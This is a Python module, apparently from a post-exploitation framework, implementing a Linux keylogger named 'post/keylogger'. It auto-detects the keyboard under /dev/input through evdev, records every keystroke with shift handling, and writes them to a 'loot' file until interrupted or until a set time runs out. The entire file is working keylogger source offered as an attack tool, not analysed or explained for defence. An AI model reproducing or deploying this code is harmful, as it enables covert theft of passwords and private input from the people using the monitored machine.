import os
import sys
import time
import threading
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'post/keylogger',
        'description': 'Unix keylogger that reads keyboard events from /dev/input and logs keystrokes to a file.',
        'options': {
            'LOG_FILE': 'File to save keystrokes [default: loot/keylog.txt]',
            'DURATION': 'How many seconds to log (0 = run until Ctrl+C) [default: 0]',
            'INPUT_DEV': 'Input device path [default: auto-detect]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _find_keyboard(self):
        """Find the keyboard input device."""
        try:
            import evdev
            devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
            for dev in devices:
                caps = dev.capabilities(verbose=True)
                # Look for device with KEY capabilities
                if any('KEY' in str(k) for k in caps.keys()):
                    if any(name in dev.name.lower() for name in ['keyboard', 'kbd', 'key']):
                        return dev.path
            # Return first device with keys if no obvious keyboard
            for dev in devices:
                caps = dev.capabilities(verbose=True)
                if any('KEY' in str(k) for k in caps.keys()):
                    return dev.path
        except ImportError:
            pass
        return None

    def _evdev_log(self, device_path, log_file, duration):
        """Use evdev to capture keystrokes."""
        import evdev
        from evdev import ecodes, categorize

        KEY_MAP = {
            'KEY_SPACE': ' ', 'KEY_ENTER': '\n', 'KEY_TAB': '\t',
            'KEY_BACKSPACE': '[BS]', 'KEY_LEFTSHIFT': '', 'KEY_RIGHTSHIFT': '',
            'KEY_CAPS': '[CAPS]', 'KEY_ESC': '[ESC]',
        }

        dev = evdev.InputDevice(device_path)
        console.print(f"[green][+] Logging keystrokes from: {dev.name} ({device_path})[/green]")
        console.print(f"[cyan][*] Writing to: {log_file}[/cyan]")
        log_action(f"Keylogger started on {device_path} → {log_file}")

        start = time.time()
        shift_held = False

        with open(log_file, 'a') as f:
            f.write(f"\n[=== Session started {time.ctime()} ===]\n")
            for event in dev.read_loop():
                if duration > 0 and (time.time() - start) > duration:
                    break
                if event.type == ecodes.EV_KEY:
                    key_event = categorize(event)
                    if key_event.keystate == key_event.key_down:
                        key = key_event.keycode
                        if isinstance(key, list):
                            key = key[0]
                        if key in ('KEY_LEFTSHIFT', 'KEY_RIGHTSHIFT'):
                            shift_held = True
                            continue
                        char = KEY_MAP.get(key, '')
                        if not char:
                            # Convert KEY_A -> 'a'
                            raw = key.replace('KEY_', '').lower()
                            if len(raw) == 1:
                                char = raw.upper() if shift_held else raw
                            else:
                                char = f'[{raw}]'
                        f.write(char)
                        f.flush()
                    elif key_event.keystate == key_event.key_up:
                        if key_event.keycode in ('KEY_LEFTSHIFT', 'KEY_RIGHTSHIFT'):
                            shift_held = False

    def run(self):
        log_file = self.framework.options.get('LOG_FILE', 'loot/keylog.txt')
        duration = int(self.framework.options.get('DURATION', 0))
        dev_path = self.framework.options.get('INPUT_DEV', '')

        Path('loot').mkdir(exist_ok=True)

        try:
            import evdev
        except ImportError:
            console.print("[red][!] 'evdev' is not installed. Run: pip install evdev[/red]")
            console.print("[dim]Note: evdev requires root and Linux.[/dim]")
            return

        if not dev_path:
            dev_path = self._find_keyboard()
            if not dev_path:
                console.print("[red][!] No keyboard input device found. Set INPUT_DEV manually.[/red]")
                console.print("[dim]  List devices: ls /dev/input/by-id/[/dim]")
                return
            console.print(f"[cyan][*] Auto-detected keyboard: {dev_path}[/cyan]")

        if os.geteuid() != 0:
            console.print("[yellow][!] Warning: keylogger may need root to read /dev/input devices.[/yellow]")

        try:
            self._evdev_log(dev_path, log_file, duration)
        except KeyboardInterrupt:
            console.print(f"\n[yellow][!] Keylogger stopped. Log saved to {log_file}[/yellow]")
        except PermissionError:
            console.print("[red][!] Permission denied — run as root.[/red]")
        except Exception as e:
            console.print(f"[red][!] Keylogger error: {e}[/red]")
